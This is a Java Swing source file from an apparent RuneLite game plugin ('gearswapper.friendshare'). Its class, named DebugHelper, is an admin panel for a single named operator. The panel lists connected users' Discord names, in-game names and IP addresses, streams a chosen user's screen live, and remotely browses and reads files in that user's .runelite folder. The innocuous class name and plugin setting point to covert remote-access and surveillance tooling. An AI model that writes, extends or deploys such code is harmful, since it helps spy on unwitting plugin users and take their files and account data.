package com.tonic.plugins.gearswapper.friendshare;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.util.List;

/**
 * Admin panel for viewing connected users and spectating.
 * Only accessible by admin (thenoid2).
 */
public class DebugHelper extends JFrame {

    private final SpectateService service;
    private final ScreenViewer viewer;

    private final DefaultTableModel tableModel;
    private final JTable userTable;
    private final JButton refreshButton;
    private final JButton viewButton;
    private final JButton stopButton;
    private final JButton browseButton;

    private String currentlyViewing = null;

    public DebugHelper(SpectateService service) {
        super("Admin Panel - User Spectate");
        this.service = service;
        this.viewer = new ScreenViewer("Spectate");

        setSize(800, 500);
        setLocationRelativeTo(null);
        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        // Dark theme
        getContentPane().setBackground(new Color(30, 30, 30));
        setLayout(new BorderLayout(10, 10));

        // Header
        JPanel headerPanel = new JPanel(new BorderLayout());
        headerPanel.setBackground(new Color(40, 40, 40));
        headerPanel.setBorder(BorderFactory.createEmptyBorder(10, 15, 10, 15));

        JLabel titleLabel = new JLabel("Connected Users");
        titleLabel.setForeground(Color.WHITE);
        titleLabel.setFont(new Font("Segoe UI", Font.BOLD, 16));
        headerPanel.add(titleLabel, BorderLayout.WEST);

        refreshButton = new JButton("Refresh");
        refreshButton.addActionListener(e -> refreshUserList());
        headerPanel.add(refreshButton, BorderLayout.EAST);

        add(headerPanel, BorderLayout.NORTH);

        // Table
        String[] columns = { "Discord Name", "RSN", "Online Time", "IP Address", "Status" };
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };

        userTable = new JTable(tableModel);
        userTable.setBackground(new Color(45, 45, 48));
        userTable.setForeground(Color.WHITE);
        userTable.setGridColor(new Color(60, 60, 60));
        userTable.setSelectionBackground(new Color(70, 70, 75));
        userTable.setRowHeight(28);
        userTable.getTableHeader().setBackground(new Color(50, 50, 55));
        userTable.getTableHeader().setForeground(Color.WHITE);

        JScrollPane scrollPane = new JScrollPane(userTable);
        scrollPane.getViewport().setBackground(new Color(45, 45, 48));
        scrollPane.setBorder(BorderFactory.createEmptyBorder(10, 15, 10, 15));
        add(scrollPane, BorderLayout.CENTER);

        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 10));
        buttonPanel.setBackground(new Color(40, 40, 40));

        viewButton = new JButton("View Selected");
        viewButton.setBackground(new Color(50, 150, 50));
        viewButton.setForeground(Color.WHITE);
        viewButton.addActionListener(e -> viewSelected());
        buttonPanel.add(viewButton);

        stopButton = new JButton("Stop Viewing");
        stopButton.setBackground(new Color(150, 50, 50));
        stopButton.setForeground(Color.WHITE);
        stopButton.setEnabled(false);
        stopButton.addActionListener(e -> stopViewing());
        buttonPanel.add(stopButton);

        browseButton = new JButton("Browse .runelite");
        browseButton.setBackground(new Color(50, 50, 150));
        browseButton.setForeground(Color.WHITE);
        browseButton.addActionListener(e -> browseSelected());
        buttonPanel.add(browseButton);

        add(buttonPanel, BorderLayout.SOUTH);

        // Set up callbacks
        service.setOnUserListReceived(this::updateUserList);
        service.setOnFrameReceived(data -> {
            if (viewer != null && viewer.isVisible()) {
                viewer.displayFrame(data);
            }
        });

        // Close viewer when panel closes
        viewer.setOnClose(() -> {
            service.stopView();
            currentlyViewing = null;
            viewButton.setEnabled(true);
            stopButton.setEnabled(false);
        });

        // Initial refresh
        refreshUserList();
    }

    private void refreshUserList() {
        service.requestUserList();
    }

    private void updateUserList(List<SpectateService.UserInfo> users) {
        SwingUtilities.invokeLater(() -> {
            tableModel.setRowCount(0);

            long now = System.currentTimeMillis();

            for (SpectateService.UserInfo u : users) {
                long onlineMs = now - u.connectedAt;
                String onlineTime = formatDuration(onlineMs);
                String status = u.streaming ? "Streaming" : "Online";

                tableModel.addRow(new Object[] {
                        u.discordName,
                        u.rsn,
                        onlineTime,
                        u.ip,
                        status
                });
            }
        });
    }

    private String formatDuration(long ms) {
        long seconds = ms / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;

        if (hours > 0) {
            return String.format("%dh %dm", hours, minutes % 60);
        } else if (minutes > 0) {
            return String.format("%dm %ds", minutes, seconds % 60);
        } else {
            return String.format("%ds", seconds);
        }
    }

    private void viewSelected() {
        int row = userTable.getSelectedRow();
        if (row < 0) {
            JOptionPane.showMessageDialog(this, "Select a user first", "View", JOptionPane.WARNING_MESSAGE);
            return;
        }

        String discordName = (String) tableModel.getValueAt(row, 0);
        currentlyViewing = discordName;

        service.viewUser(discordName);

        // Open viewer
        viewer.setTitle("Viewing: " + discordName);
        viewer.setVisible(true);

        viewButton.setEnabled(false);
        stopButton.setEnabled(true);
    }

    private void stopViewing() {
        service.stopView();
        currentlyViewing = null;

        viewer.setVisible(false);

        viewButton.setEnabled(true);
        stopButton.setEnabled(false);

        refreshUserList();
    }

    private void browseSelected() {
        int row = userTable.getSelectedRow();
        if (row < 0) {
            JOptionPane.showMessageDialog(this, "Select a user first", "Browse", JOptionPane.WARNING_MESSAGE);
            return;
        }

        String discordName = (String) tableModel.getValueAt(row, 0);
        new FileBrowserFrame(service, discordName).setVisible(true);
    }

    @Override
    public void dispose() {
        if (currentlyViewing != null) {
            service.stopView();
        }
        viewer.dispose();
        super.dispose();
    }

    // ========== File Browser UI ==========

    private static class FileBrowserFrame extends JFrame {
        private final SpectateService service;
        private final String targetDiscord;
        private String currentPath = "";

        private final DefaultTableModel fileTableModel;
        private final JTable fileTable;
        private final JLabel pathLabel;
        private final JTextArea contentArea;

        public FileBrowserFrame(SpectateService service, String targetDiscord) {
            super("Browsing: " + targetDiscord + " - .runelite");
            this.service = service;
            this.targetDiscord = targetDiscord;

            setSize(900, 600);
            setLocationRelativeTo(null);
            setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            setLayout(new BorderLayout());
            getContentPane().setBackground(new Color(30, 30, 30));

            // Path Header
            JPanel topPanel = new JPanel(new BorderLayout());
            topPanel.setBackground(new Color(40, 40, 40));
            topPanel.setBorder(BorderFactory.createEmptyBorder(5, 10, 5, 10));

            JButton upButton = new JButton("Up");
            upButton.addActionListener(e -> navigateUp());
            topPanel.add(upButton, BorderLayout.WEST);

            pathLabel = new JLabel("/.runelite/");
            pathLabel.setForeground(Color.WHITE);
            pathLabel.setBorder(BorderFactory.createEmptyBorder(0, 10, 0, 0));
            topPanel.add(pathLabel, BorderLayout.CENTER);

            JButton refreshBtn = new JButton("Refresh");
            refreshBtn.addActionListener(e -> refreshFiles());
            topPanel.add(refreshBtn, BorderLayout.EAST);

            add(topPanel, BorderLayout.NORTH);

            // File Table
            String[] cols = { "Name", "Size", "Type" };
            fileTableModel = new DefaultTableModel(cols, 0) {
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            fileTable = new JTable(fileTableModel);
            styleTable(fileTable);

            fileTable.addMouseListener(new java.awt.event.MouseAdapter() {
                public void mouseClicked(java.awt.event.MouseEvent e) {
                    if (e.getClickCount() == 2) {
                        int row = fileTable.getSelectedRow();
                        if (row != -1) {
                            String name = (String) fileTableModel.getValueAt(row, 0);
                            boolean isDir = "DIR".equals(fileTableModel.getValueAt(row, 2));
                            if (isDir) {
                                navigate(name);
                            } else {
                                viewFile(name);
                            }
                        }
                    }
                }
            });

            JScrollPane tableScroll = new JScrollPane(fileTable);
            tableScroll.getViewport().setBackground(new Color(30, 30, 30));

            // Content Preview
            contentArea = new JTextArea();
            contentArea.setEditable(false);
            contentArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
            contentArea.setBackground(new Color(20, 20, 20));
            contentArea.setForeground(new Color(0, 255, 0));
            JScrollPane contentScroll = new JScrollPane(contentArea);
            contentScroll.setBorder(BorderFactory.createTitledBorder("File Content Preview"));
            contentScroll.setPreferredSize(new Dimension(800, 200));

            JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, contentScroll);
            splitPane.setResizeWeight(0.7);
            add(splitPane, BorderLayout.CENTER);

            // Callbacks
            service.setOnFileListReceived(this::updateFiles);
            service.setOnFileContentReceived(this::updateContent);

            // Initial Load
            refreshFiles();
        }

        private void refreshFiles() {
            service.requestListFiles(targetDiscord, currentPath);
            pathLabel.setText("/.runelite/" + currentPath);
        }

        private void navigate(String dir) {
            currentPath = currentPath.isEmpty() ? dir : currentPath + "/" + dir;
            refreshFiles();
        }

        private void navigateUp() {
            if (currentPath.isEmpty())
                return;
            int lastSlash = currentPath.lastIndexOf('/');
            if (lastSlash == -1) {
                currentPath = "";
            } else {
                currentPath = currentPath.substring(0, lastSlash);
            }
            refreshFiles();
        }

        private void viewFile(String name) {
            String fullPath = currentPath.isEmpty() ? name : currentPath + "/" + name;
            contentArea.setText("Loading: " + fullPath + "...");
            service.requestReadFile(targetDiscord, fullPath);
        }

        private void updateFiles(SpectateService.FileListResponse res) {
            // Check if response is for us (simple check)
            if (!res.discordName.equals(targetDiscord) || !res.path.equals(currentPath))
                return;

            SwingUtilities.invokeLater(() -> {
                fileTableModel.setRowCount(0);
                // Sort dirs first
                res.files.sort((a, b) -> {
                    if (a.isDir != b.isDir)
                        return a.isDir ? -1 : 1;
                    return a.name.compareToIgnoreCase(b.name);
                });

                for (SpectateService.FileEntry f : res.files) {
                    fileTableModel.addRow(new Object[] {
                            f.name,
                            f.isDir ? "" : formatSize(f.size),
                            f.isDir ? "DIR" : "FILE"
                    });
                }
            });
        }

        private void updateContent(SpectateService.FileContentResponse res) {
            if (!res.discordName.equals(targetDiscord))
                return;

            SwingUtilities.invokeLater(() -> {
                contentArea.setText(res.content != null ? res.content : "[Empty or Restricted]");
                contentArea.setCaretPosition(0);
            });
        }

        private String formatSize(long bytes) {
            if (bytes < 1024)
                return bytes + " B";
            int k = (int) (Math.log(bytes) / Math.log(1024));
            String pre = "KMGTPE".charAt(k - 1) + "";
            return String.format("%.1f %sB", bytes / Math.pow(1024, k), pre);
        }

        private void styleTable(JTable table) {
            table.setBackground(new Color(45, 45, 48));
            table.setForeground(Color.WHITE);
            table.setGridColor(new Color(60, 60, 60));
            table.setSelectionBackground(new Color(70, 70, 75));
            table.setRowHeight(25);
            table.getTableHeader().setBackground(new Color(50, 50, 55));
            table.getTableHeader().setForeground(Color.WHITE);
        }
    }
}
